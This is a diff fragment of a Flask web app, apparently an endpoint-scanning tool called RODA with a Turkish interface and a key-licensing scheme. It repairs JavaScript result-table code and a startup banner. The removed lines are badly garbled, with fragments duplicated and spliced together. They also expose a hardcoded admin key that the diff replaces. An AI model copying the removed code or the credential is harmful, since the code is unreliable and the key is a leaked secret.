-        } catch (err) {}
-    };
-    event + 1;
-            document.getElementById("statLast").innerText = new Date().toLocaleString();
-            updateStatsUI();
-            return;
-        }
-        try {
-            var res = JSON.parse(e.data);
-            foundEndpoints.push(res);
-            addResultRow(resSource.onerror = function() {
-        eventSource.close();
-        btn.disabled = false;
-        btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
-        scanning = false;
-        document.getElementById("statusDot").classList.add("idle");
-        document.getElementById("statusText").innerText = "Boşta";
-   );
             updateStatsUI();
         } catch (err) {}
     };
@@ -1810,56 +1387,27 @@ function startScan() {
 }
 
 function addResultRow(res) {
-    var list = };
-}
-
-function addResultRow(res) {
     var list = document.getElementById("resultsList");
     var row = document.createElement("div");
-    row.className = "result-row document.getElementById("resultsList");
-    var row = document.createElement("div");
     row.className = "result-row";
-    var mc =";
-    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? " res.method === "GET" ? "get" : (res.method === "POST" ? "postpost" : "other");
+    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
     var cc = "cat-" + res.category.toLowerCase();
-   " : "other");
-    var cc = "cat-" + res.category.toLowerCase();
-    row.innerHTML = '<div row.innerHTML = '<div><span class="method ' + mc + '">'><span class="method ' + mc + '">' + res.method + + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-    var checked = Array.from(document.querySelectorAll.category + '</span></div>';
-    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value;("#filterContainer input:checked")).map(function(c) { return c.value; });
-    if (checked.includes(res.category)) list.appendChild(row);
-}
-
-document.getElementById("filterContainer"). });
+    row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
+    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
     if (checked.includes(res.category)) list.appendChild(row);
 }
 
 document.getElementById("filterContainer").addEventListener("change", function() {
     var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
-    var list = document.getElementById("resultsaddEventListener("change", function() {
-    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
     var list = document.getElementById("resultsList");
     list.innerHTML = "";
     foundEndpoints.forEach(function(res) {
-        if (checkedList");
-    list.innerHTML = "";
-    foundEndpoints.forEach(function(res) {
         if (checked.includes(res.category)) {
-            var row = document.createElement("div.includes(res.category)) {
             var row = document.createElement("div");
             row.className = "result-row";
-            var mc = res.method === "GET");
-            row.className = "result-row";
-            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" ? "get" : (res.method === "POST" ? "post" : "other");
+            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
             var cc = "cat-" + res.category.toLowerCase();
-            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method" : "other");
-            var cc = "cat-" + res.category.toLowerCase();
-            row.innerHTML = '<div><span class="method ' + mc + '">' + + '</span></div><div>' + res.status + '</div res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url +><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-            list.appendChild(row);
-        }
-    });
-});
-</>';
+            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
             list.appendChild(row);
         }
     });
@@ -1869,53 +1417,27 @@ document.getElementById("filterContainer").addEventListener("change", function()
 </html>
 """
 
-# ===========================================================script>
-</body>
-</html>
-"""
-
 # ============================================================
-#=
 # BAŞLAT
 # ============================================================
 if __name__ == "__main__":
-    if not os.path.exists(KE BAŞLAT
-# ============================================================
-if __name__ == "__mainYS_FILE):
-        save_keys({})
-    if not os.path.exists(LO__":
     if not os.path.exists(KEYS_FILE):
         save_keys({})
     if not os.path.exists(LOGS_FILE):
-       GS_FILE):
         save_logs([])
 
-    port = save_logs([])
-
-    port = int(os.environ.get("PORT", int(os.environ.get("PORT", 5000))
-    print("" 5000))
+    port = int(os.environ.get("PORT", 5000))
     print("""
-    ╔════════════════════"
-    ╔══════════════════════════════════════════════════════════════════╗══════════════════════════════════════════════╗
-    ║     🔱 RODA - TAM Sİ
-    ║     🔱 RODA - TAM SİSTEM (ÇSTEM (ÇALIŞIYOR)                        ALIŞIYOR)                         ║
-    ║     http://127 ║
-    ║     http://127.0.0.1:""" + str(port) + """                              .0.0.1:""" + str(port) + """                               ║
-    ║     Admin Key: Roda@2026 ║
-    ║     Admin Key: Roda@2026#Secure!X7                           ║
-    ║     ✅ #Secure!X7                           ║
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║     🔱 RODA - TAM SİSTEM (SON VERSİYON)                       ║
+    ║     http://127.0.0.1:""" + str(port) + """                               ║
+    ║     Admin Key: Gizlidir                                       ║
     ║     ✅ 20 Platform | ✅ 2 Parse Modu | ✅ Webhook             ║
-    ║     ✅ 1 Key =20 Platform | ✅ 2 Parse Modu | ✅ Webhook             ║
     ║     ✅ 1 Key = 1 IP | ✅ Admin Log Sistemi                   ║
-    ║     ✅ Key Süresi: Dakika/S 1 IP | ✅ Admin Log Sistemi                   ║
     ║     ✅ Key Süresi: Dakika/Saat/Gün                           ║
-    ║aat/Gün                           ║
-    ║     ✅ Renk: #60FF00 + #009fc5                                   ✅ Renk: #60FF00 + #009fc5                               ║
+    ║     ✅ Renk: #60FF00 + #009fc5                               ║
+    ║     ✅ Login Düzeltildi (addEventListener)                   ║
     ╚══════════════════════════════════════════════════════════════════╝
-    ║
-    ╚══════════════════════════════════════════════════════════════════ """)
-
-    app.run(host="0.0.0.0", port=port, debug╝
     """)
 
-    app.run(host="0.0.0.0", port=port,=False)
+    app.run(host="0.0.0.0", port=port, debug=False)
